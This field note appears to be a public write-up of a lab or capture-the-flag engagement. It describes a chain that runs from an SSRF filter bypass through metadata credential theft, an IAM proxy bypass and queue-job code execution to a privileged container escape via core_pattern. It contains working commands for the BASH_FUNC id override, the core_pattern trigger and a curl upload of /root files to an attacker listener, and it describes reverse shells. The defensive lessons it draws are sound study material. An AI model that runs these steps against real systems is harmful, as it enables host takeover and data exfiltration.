---
title: "Field Note: Cloud-Native SSRF Chain, IAM Proxy Bypass, and Privileged Container Core-Pattern Escape"
author: CipherDrake
category: "field-note"
date: "2026-07-13"
techniques:
  - ssrf-filter-bypass
  - imds-credential-extraction
  - iam-proxy-bypass
  - queue-injection-rce
  - bash-func-entrypoint-bypass
  - container-escape-core-pattern
  - overlay-upperdir-host-write
tags:
  - cloud-native
  - ssrf
  - container-escape
  - imds
  - bash-func
  - core-pattern
visibility: "public"
---

# Field Note: Cloud-Native SSRF Chain, IAM Proxy Bypass, and Privileged Container Core-Pattern Escape

> **VISIBILITY: PUBLIC.** Sanitized; safe to post anywhere.

This note distills the portable lessons from a recent engagement against a cloud-native Linux target. No box names, platform names, IP addresses, endpoints, parameter names, flag values, or stack-specific details appear here. The techniques generalize across any engagement that touches a similar surface.

---

## What the engagement looked like

The target exposed a web application whose preview function accepted a user-supplied URL and fetched it server-side, echoing the full response body back to the caller. The application ran alongside a cloud API emulator on the same host. Foothold came from chaining through that SSRF into the instance metadata service to pull cloud credentials. Those credentials gave producer rights on a job queue, which became a code-execution channel via job injection into a worker process. After reaching a shell in the worker container, the privilege escalation to host root required bypassing an emulator's IAM proxy layer, identifying the one compute service in the specific version that honored a privileged flag, bypassing a container entrypoint root-detection check, and then using a privileged container's access to the host overlay filesystem to plant a kernel core-dump handler that executed as host root.

The engagement ran across multiple sessions. The root path required reading the emulator's open-source code for the specific deployed version and a nudge from a community resource pointing at the intended technique class. Several plausible paths were exhausted before finding the working one.

---

## Lesson 1: Layered SSRF filters must be characterized in isolation

The application's SSRF filter had two independent gates evaluated in sequence. The first gate checked that the URL ended with a recognized extension. The second gate checked whether the URL targeted an internal network resource. Because the first gate was evaluated before the second, it was impossible to observe the second gate's behavior until the first gate was satisfied.

The bypass used two distinct primitives, one per gate:

**Gate 1 bypass -- URL fragment as an extension satisfier:**
URL fragments (`#.ext`) are stripped from the request before the HTTP client sends it upstream. Appending `#.yaml` to any URL made the first gate (which matched the raw URL string) see a `.yaml` suffix, while the upstream request was sent to the actual path without the fragment. This is standard RFC-compliant behavior for all HTTP client libraries.

**Gate 2 bypass -- alternate IP representation:**
The second gate performed a string match against denylist terms, including the literal dotted-decimal form of the metadata service address. It did not resolve hostnames or normalize IP representations. Expressing the same address as a decimal integer bypassed the string match entirely. The operating system's network stack accepted the decimal form and connected to the correct address.

**Portable recognition:** When an SSRF attempt is blocked by an extension check before reaching the IP denylist, the two gates are independent and must be characterized separately. Satisfy the extension check with a fragment; then test the IP denylist using alternate representations (decimal integer, hex, IPv6-mapped IPv4, octal-encoded octets, zero-padded octets). Any of these can break a string-based denylist. The correct defense is to resolve the target to an IP address and check the resolved IP against a denylist or allowlist -- never to match the raw URL string.

---

## Lesson 2: IMDS credential extraction via SSRF

Once the SSRF filter was bypassed, the standard cloud instance metadata service path was readable. Walking the metadata tree revealed the IAM role name; fetching the credentials path for that role returned a full set of temporary access credentials (key ID, secret, session token).

**Portable recognition:** Any SSRF that can reach the metadata service address should immediately enumerate the IAM credentials path. The tree structure is the same across major cloud providers and their emulators:

```
/latest/meta-data/iam/security-credentials/     <- role name listing
/latest/meta-data/iam/security-credentials/<role> <- credential JSON
/latest/user-data                               <- bootstrap data (sometimes holds secrets)
/latest/dynamic/instance-identity/document      <- region, account-id
```

Credentials obtained this way authenticate to the cloud API with the permissions of that IAM role.

---

## Lesson 3: IAM proxy enforcement bypassed via direct backend access

After obtaining cloud credentials, the role's permissions were enumerated against the public-facing API endpoint. The role appeared restricted to a single queue service with producer rights only. All other service APIs returned permission-denied errors.

However, inside the worker container, the cloud emulator backend was reachable directly at its internal bridge IP address. The cloud emulator used default credentials (a well-known test username and password) that bypassed all role-scoped access controls. The permission enforcement existed only at the nginx reverse proxy layer in front of the emulator. Reaching the emulator directly with the default credentials returned full administrative access.

**Portable recognition:** When IAM enforcement appears at a gateway/proxy layer rather than at the backend service itself, any foothold inside the network perimeter can bypass it. Default or hardcoded credentials on cloud-emulator backends (LocalStack, Moto, similar tools) are a common oversight in development and testing environments that find their way into deployed boxes. When scoped-role denials are encountered from a foothold that has network access to the backend, test the backend directly with default or known credentials.

---

## Lesson 4: SQS producer rights as a code-execution channel

With producer rights on a job queue and access to the worker process's execution environment (from the foothold shell), it was possible to inject malicious jobs into the queue that the worker would execute. The challenge was identifying the correct job schema: the producer role could only enqueue messages; it could not read them back or inspect what the worker expected.

**Blind schema oracle:** Eight candidate execution-field names were submitted as separate jobs, each containing a unique HTTP callback to an attacker-controlled listener on a known-open egress port. The field names whose callbacks fired identified both the execution field and the runtime environment. This technique works for any queue-based job system where:
- The producer role has SendMessage rights
- The worker process runs submitted code on a server-side host
- There is an outbound channel for confirming execution (HTTP callback, DNS lookup, time-based delay)

**Egress mapping:** The worker container had filtered outbound access; only the single port that was already in use for the initial callback was open outbound. Mapping which ports are open before settling on a reverse shell destination avoids silent failures.

**Persistence across job timeout:** The worker enforced a per-job timeout and killed the entire process group at expiration. A reverse shell started as a direct child of the job process died with it. The fix: use the platform's equivalent of `subprocess.Popen` with session detachment (`start_new_session=True` in Python, `setsid` in shell) so the reverse shell process becomes the leader of a new process group and survives the job's group kill.

---

## Lesson 5: IAM proxy bypass unlocks compute services

With emulator administrative access, the full compute service catalog became available. The critical discovery from reading the emulator's source code for the specific deployed version: the CodeBuild-equivalent service honored a privileged container flag. Lambda and container orchestration services did not, in that version; CodeBuild did. The difference is version-specific and not documented in the API. Source review was required to confirm it.

**Portable recognition:** When a cloud emulator exposes compute services (Lambda, ECS/EKS, CodeBuild, etc.), check whether any of them spawn containers with elevated privileges or host access. Read the emulator's source for the exact deployed version. The question "which compute service in this version honors a privileged flag" has different answers across versions.

---

## Lesson 6: BASH_FUNC_name%% as a container entrypoint bypass technique

The container image used as the privileged compute base had an entrypoint script that detected whether the process was running as root (by calling the `id` utility) and dropped privileges if so. Overriding the `id` utility at the shell level bypassed this check.

Bash exports shell functions as environment variables using the naming convention `BASH_FUNC_name%%`. An exported function with the name `id` overrides the `id` binary for any subprocess that inherits the environment and is launched by bash or a bash-derived shell:

```bash
export 'BASH_FUNC_id%%=() { [ "$1" = -u ] && echo 1000 || printf "uid=1000(builder) gid=1000(builder)\n"; }'
```

When this environment variable is set, any invocation of `id -u` in a bash process (or its children) calls the function instead of the binary, returning the fake UID. The entrypoint saw a non-root UID and skipped the privilege drop. The container then ran as root with full capabilities from the privileged flag.

**Portable recognition:** Any container entrypoint that uses shell utilities (`id`, `whoami`, `hostname`, `groups`) to make security decisions is vulnerable to this override if the caller controls environment variables. The correct defense is to set the container user at image build time via the Dockerfile `USER` instruction, not via a runtime check in the entrypoint.

---

## Lesson 7: Privileged containers and the overlay upperdir host-write primitive

A container running with full capabilities (from the privileged flag) has several paths to write files on the host filesystem. The overlay upperdir is one of the cleanest: it does not require mounting anything, does not depend on a host docker socket, and is always present in overlay-based container runtimes.

**Finding the path:**
```
/proc/self/mountinfo
```
This kernel file lists all mounts visible to the current process. For a container using an overlay filesystem, one of the entries contains `upperdir=<host path>`. That host path is the container's writable overlay layer -- files written there are visible on the host at the same absolute path.

**Using it:**
From inside the privileged container (root, full caps), write an executable payload to `$UDIR/x.sh` where `$UDIR` is the extracted upperdir. The file exists on the host as `/var/lib/containerd/.../snapshots/<N>/fs/x.sh` (or the equivalent for the host's container runtime).

**Triggering host execution via core_pattern:**
The kernel's `/proc/sys/kernel/core_pattern` accepts a `|` prefix that designates a usermode helper: the named executable is invoked by the kernel when any process produces a core dump. Setting this to `|<absolute host path to payload>` and then triggering a core dump (by sending SIGSEGV to any background process) executes the payload as host root.

```
echo "|/overlay/upperdir/path/x.sh" > /proc/sys/kernel/core_pattern
kill -SEGV $BACKGROUND_PID
```

Writing `/proc/sys/kernel/core_pattern` requires `CAP_SYS_ADMIN`. A privileged container has it. The host kernel enforces the core-pattern handler with root privileges regardless of the triggering process's UID.

**Portable recognition:** A privileged container is a host-root primitive. The overlay upperdir is the writable host path; core_pattern is the execution trigger. Neither requires a docker socket. Any service or CI pipeline that grants privileged container access to untrusted workloads is granting effective host root.

---

## Lesson 8: HTTP POST callback as an alternative to SSH key injection

When a file write to the host's root user authorized_keys produced a write confirmation but SSH still prompted for a password (likely a race condition or missing directory in the minimal kernel handler environment), an alternative exfil path succeeded immediately:

```
curl --data-binary @/root/<target-file> http://attacker:PORT/
```

A plain `nc -lvnkp PORT` on the attacker received the file contents in the POST body. This pattern is worth keeping as a fallback whenever a write-then-connect approach is unreliable. The kernel core handler environment is minimal; verify that the required binaries (mkdir, chmod, ssh-keygen equivalents) are available and in PATH before relying on a multi-step SSH key plant.

---

## Encoding pitfall: `\\n` vs `\n` in programmatic payload generation

When building structured payloads (YAML, JSON, shell scripts) inside Python f-strings, the escape sequence for newlines matters:
- `\n` in a Python f-string produces a real newline character in the resulting string.
- `\\n` in a Python f-string produces the two-character literal sequence backslash + n.

YAML and shell scripts need real newlines to separate commands/lines. Building a buildspec or shell script with `\\n` as a separator produces a single long line that parsers reject or shells misinterpret. This cost several failed iterations before the cause was identified. When generating multi-line content programmatically, verify the resulting string with a round-trip through the target parser (e.g., `yaml.safe_load(yaml.dump(payload))`) before sending it.

---

## Summary of portable primitives from this engagement

| technique | what it requires | what it enables |
|---|---|---|
| SSRF Gate 1 bypass via URL fragment | application strips fragment before fetch | any URL passes extension check |
| SSRF Gate 2 bypass via decimal IP | string-based IP denylist | reaches loopback and metadata service |
| IMDS credential extraction | reachable SSRF to metadata service | cloud role credentials |
| IAM proxy bypass | foothold on backend network + known default creds | full cloud admin bypassing role scoping |
| Blind SQS injection oracle | producer rights + outbound HTTP channel | identifies job schema field names |
| Detached subprocess persistence | process-group-kill job timeout | reverse shell survives job expiry |
| BASH_FUNC_name%% entrypoint bypass | caller controls environment variables | bypass entrypoint root-detection |
| Overlay upperdir host-write | privileged container (CAP_SYS_ADMIN) | write to host filesystem without docker socket |
| core_pattern usermode helper | CAP_SYS_ADMIN + writable upperdir | arbitrary host-root code execution |
| curl POST exfil | outbound HTTP from payload context | data exfil when interactive channels unreliable |
